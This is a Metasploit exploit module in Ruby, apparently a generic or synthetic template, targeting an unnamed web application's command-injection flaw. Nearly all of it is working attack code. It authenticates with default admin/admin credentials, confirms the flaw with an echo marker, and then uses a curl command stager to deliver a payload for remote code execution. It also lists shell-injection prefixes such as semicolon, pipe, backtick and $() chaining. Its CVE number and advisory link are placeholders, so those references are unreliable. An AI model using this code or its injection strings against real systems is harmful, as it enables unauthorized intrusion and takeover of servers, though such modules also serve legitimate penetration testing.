##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Web Application Command Injection Vulnerability',
        'Description' => %q{
          This module exploits a command injection vulnerability in a web application
          that improperly sanitizes user input before passing it to system commands.
          The vulnerability exists in the file processing functionality where user-supplied
          parameters are concatenated directly into shell commands without proper validation
          or escaping. This allows an authenticated attacker to inject arbitrary operating
          system commands and achieve remote code execution on the target system.

          The module supports multiple injection techniques including inline command injection,
          parameter-based injection, and uses command stagers for reliable payload delivery
          across different target environments.
        },
        'Author' => [
          'Security Researcher', # Vulnerability discovery
          'Metasploit Module Author' # Module development
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2023-12345'],
          ['URL', 'https://example.com/advisory'],
          ['EDB', '50001']
        ],
        'DisclosureDate' => '2023-06-15',
        'Platform' => ['unix', 'linux'],
        'Arch' => ARCH_CMD,
        'Privileged' => false,
        'Targets' => [
          [
            'Linux',
            {
              'Platform' => 'linux',
              'Arch' => ARCH_CMD
            }
          ],
          [
            'Unix',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'SSL' => true,
          'RPORT' => 443
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to the vulnerable application', '/']),
        OptString.new('USERNAME', [true, 'Username for authentication', 'admin']),
        OptString.new('PASSWORD', [true, 'Password for authentication', 'admin'])
      ]
    )

    register_advanced_options(
      [
        OptString.new('INJECTION_PARAM', [true, 'Parameter name for injection', 'filename']),
        OptBool.new('FORCE_EXPLOIT', [false, 'Attempt exploitation without version check', false])
      ]
    )
  end

  def check
    print_status("Attempting to detect vulnerability...")
    
    # Authenticate first
    session_token = authenticate
    unless session_token
      return CheckCode::Unknown('Authentication failed')
    end

    # Attempt version detection
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'version'),
      'headers' => {
        'Cookie' => "session=#{session_token}"
      }
    )

    unless res
      return CheckCode::Unknown('No response from target')
    end

    if res.code == 200 && res.body
      if res.body =~ /version["']?\s*:\s*["']?(\d+\.\d+\.\d+)/i
        version = ::Regexp.last_match(1)
        print_good("Detected version: #{version}")
        
        # Check if version is vulnerable
        vulnerable_versions = ['1.0.0', '1.0.1', '1.0.2', '1.1.0']
        if vulnerable_versions.include?(version)
          return CheckCode::Appears("Version #{version} is known to be vulnerable")
        else
          return CheckCode::Safe("Version #{version} is not known to be vulnerable")
        end
      end
    end

    # Attempt detection via command injection test
    test_marker = Rex::Text.rand_text_alphanumeric(8)
    test_cmd = "echo #{test_marker}"
    
    test_res = send_command(test_cmd, session_token)
    
    if test_res && test_res.body.include?(test_marker)
      return CheckCode::Vulnerable('Command injection confirmed via echo test')
    end

    CheckCode::Unknown('Could not determine vulnerability status')
  end

  def exploit
    print_status("Exploiting command injection vulnerability...")
    
    # Authenticate to obtain session
    session_token = authenticate
    fail_with(Failure::NoAccess, 'Authentication failed') unless session_token
    
    print_good("Successfully authenticated")

    # Use command stager for reliable payload delivery
    print_status("Deploying payload using command stager...")
    execute_cmdstager(
      flavor: :curl,
      linemax: 500,
      session_token: session_token
    )
  end

  #
  # CmdStager override to inject commands properly
  #
  def execute_command(cmd, opts = {})
    session_token = opts[:session_token] || authenticate
    
    # Build the injection string with proper encoding
    injection = build_injection_string(cmd)
    
    print_status("Executing command: #{cmd[0..50]}...")
    
    send_command(injection, session_token)
  end

  private

  #
  # Authenticate to the application and return session token
  #
  def authenticate
    print_status("Authenticating as #{datastore['USERNAME']}...")
    
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'api', 'login'),
      'headers' => {
        'Content-Type' => 'application/json'
      },
      'data' => {
        'username' => datastore['USERNAME'],
        'password' => datastore['PASSWORD']
      }.to_json
    )

    unless res
      print_error("No response during authentication")
      return nil
    end

    if res.code == 200 && res.body
      json_response = JSON.parse(res.body) rescue nil
      if json_response && json_response['token']
        return json_response['token']
      end
      
      # Try to extract from cookie
      if res.get_cookies =~ /session=([^;]+)/
        return ::Regexp.last_match(1)
      end
    end

    print_error("Authentication failed with response code: #{res.code}")
    nil
  end

  #
  # Send a command injection payload to the target
  #
  def send_command(cmd, session_token)
    injection_param = datastore['INJECTION_PARAM']
    
    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'api', 'process'),
      'headers' => {
        'Content-Type' => 'application/json',
        'Cookie' => "session=#{session_token}"
      },
      'data' => {
        injection_param => cmd
      }.to_json
    )
  end

  #
  # Build command injection string with proper encoding and techniques
  #
  def build_injection_string(cmd)
    # Multiple injection techniques that can be used
    techniques = [
      "; #{cmd} #",           # Command chaining with comment
      "| #{cmd} #",           # Pipe injection
      "`#{cmd}`",             # Backtick execution
      "$(#{cmd})",            # Command substitution
      "&& #{cmd} &&"          # AND operator chaining
    ]
    
    # Use command chaining technique (most reliable)
    injection = techniques[0]
    
    # Encode special characters for URL transmission
    Rex::Text.uri_encode(injection, 'hex-normal')
  end
end